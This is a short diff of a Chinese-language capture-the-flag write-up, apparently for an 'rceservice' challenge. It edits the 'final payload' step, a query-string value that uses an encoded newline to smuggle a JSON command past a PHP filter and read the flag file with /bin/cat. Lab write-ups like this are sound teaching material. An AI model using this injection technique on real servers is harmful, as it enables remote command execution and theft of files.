@@ -54,7 +54,7 @@ if (isset($_REQUEST['cmd'])) {
 4.然后构造最终payload
 
 ```
-?cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
+?cmd=\{\%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
 ```
 
 ![](屏幕截图-2023-09-13-202039.png)
